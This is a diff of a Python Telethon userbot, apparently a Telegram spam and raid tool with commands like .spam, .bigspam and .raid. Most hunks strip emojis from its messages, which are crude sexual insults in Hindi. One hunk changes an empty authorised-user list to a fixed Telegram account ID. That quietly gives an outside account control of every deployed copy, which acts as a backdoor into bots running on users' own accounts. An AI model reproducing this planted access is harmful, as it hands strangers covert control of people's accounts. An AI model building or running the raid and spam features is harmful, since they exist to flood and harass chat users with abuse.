@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = []
+SMEX_USERS = [5216869404]
 for x in SUDO: 
     SMEX_USERS.append(x)
     
@@ -722,7 +722,7 @@ async def _(e):
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)     
         if len(e.text) > 5:
             bio = str(yukki[0])
-            text = "RUK JA BSDKX 😏...."
+            text = "RUK JA MADHARCHOD ...."
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(functions.account.UpdateProfileRequest(about=bio))
@@ -766,7 +766,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(functions.channels.JoinChannelRequest(channel=bc))
-                await event.edit("HA APUN AAGYA...SUCCESSFULLY JOINED...")
+                await event.edit("HA AAGYA TERA BAAP...SUCCESSFULLY JOINED...")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -808,7 +808,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(ImportChatInviteRequest(bc))
-                await event.edit("KYA RE PAPA SE DAR K GRP PRIVATE KAR DIYA MADHARCHOD 😂💋🤤...SUCCESSFULLY JOINED...")          except Exception as e:
+                await event.edit("KYA RE PAPA SE DAR K GRP PRIVATE KAR DIYA MADHARCHOD...SUCCESSFULLY JOINED...")          except Exception as e:
                 await event.edit(str(e))   
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
@@ -889,107 +889,107 @@ async def start(event):
     if event.sender_id in SMEX_USERS:
      await idk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                                
+                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                                
                               )
      await ydk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                                
+                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                                
                               )
      await wdk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU 💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                                
+                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                                
                               )
      await hdk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU 💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                                
+                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                                
                               )
 await sdk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                          
+                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                          
                               )
      await adk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"
+                                caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"
                               )
 await bdk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                 
+                                  caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                 
                               )
      await cdk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"
+                                caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"
                               )
      await edk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                       
+                                caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                       
                               )
      await hdk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                          
+                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                          
                               )
      await ddk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                   caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                               
+                                   caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                               
                               )
      await vkk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                      
+                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                      
                               )
 await kkk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                     caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                           
+                                     caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                           
                               )
      await lkk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                      
+                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                      
                               )
      await mkk.send_file(event.chat_id,
                                   USTAD_PIC,
-                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                    
+                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                    
                               )
      await sid.send_file(event.chat_id,
                                   USTAD_PIC,
-                                      caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                           
+                                      caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                           
                               )
      await shy.send_file(event.chat_id,
                                   USTAD_PIC,
-                                   caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                              
+                                   caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                              
                               )
      await aan.send_file(event.chat_id,
                                   USTAD_PIC,
-                                         caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                         
+                                         caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                         
                               )
      await ake.send_file(event.chat_id,
                                   USTAD_PIC,
-                                              caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                 
+                                              caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                 
                               )
      await eel.send_file(event.chat_id,
                                   USTAD_PIC,
-                                            caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                 
+                                            caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                 
                               )
      await khu.send_file(event.chat_id,
                                   USTAD_PIC,
-                                     caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                           
+                                     caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                           
                               )
      await shi.send_file(event.chat_id,
                                   USTAD_PIC,
-                                        caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                         
+                                        caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                         
                               )
      await yaa.send_file(event.chat_id,
                                   USTAD_PIC,
-                                     caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                           
+                                     caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                           
                               )
      await dav.send_file(event.chat_id,
                                   USTAD_PIC,
-                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                         
+                                       caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI  \n"                         
                               )
      await raj.send_file(event.chat_id,
                                   USTAD_PIC,
-                                        caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                        
+                                        caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                        
                               )
      await put.send_file(event.chat_id,
                                   USTAD_PIC,
-                                         caption="HA BHAIYA BOLIYE\nMAI TYAR HU💋\n KISKI GAAND MAARNI HAI 🤤🤤 \n"                         
+                                         caption="HA BHAIYA BOLIYE\nMAI TYAR HU\n KISKI GAAND MAARNI HAI \n"                         
                               )        
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
 @ydk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@@ -1128,7 +1128,7 @@ async def _(e):
             qeue = que.get(g)
             appendable = [g]
             qeue.append(appendable)
-            text = "HA ABB BOL MADHARCHOD 😂💋"
+            text = "HA ABB BOL MADHARCHOD "
             await e.reply(text, parse_mode=None, link_preview=None )
       elif e.reply_to_msg_id:             
             a = await e.get_reply_message()
@@ -1138,7 +1138,7 @@ async def _(e):
             qeue = que.get(g)
             appendable = [g]
             qeue.append(appendable)
-            text = "HA ABB BOL MADHARCHOD 😂💋"
+            text = "HA ABB BOL MADHARCHOD "
             await e.reply(text, parse_mode=None, link_preview=None )
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
@@ -1230,7 +1230,7 @@ async def _(e):
 async def ping(e):
     if e.sender_id in SMEX_USERS:
         start = datetime.now()
-        text = "PONG !🚩"
+        text = "PONG "
         event = await e.reply(text, parse_mode=None, link_preview=None )
         end = datetime.now()
         ms = (end-start).microseconds / 1000
@@ -1406,7 +1406,7 @@ async def help(e):
        text = "DEKH LO YEH SAB COMMAND SE CHALTA HU BHOSDIWALE\n\nLE.BHSDK:\n.ping\n.restart\n\n𝙐𝙨𝙚𝙧𝙗𝙤𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.bio\n.join\n.pjoin\n.leave\n\n𝙎𝙥𝙖𝙢 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
        await e.reply(text, parse_mode=None, link_preview=None )
 text = """
-💋💋AAPKI GAAND MAARNE WALI MACHINE TYAR H 
+AAPKI GAAND MAARNE WALI MACHINE TYAR H 
 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 ✘ 𝑺𝑷𝑨𝑴 """
 
 print(text)
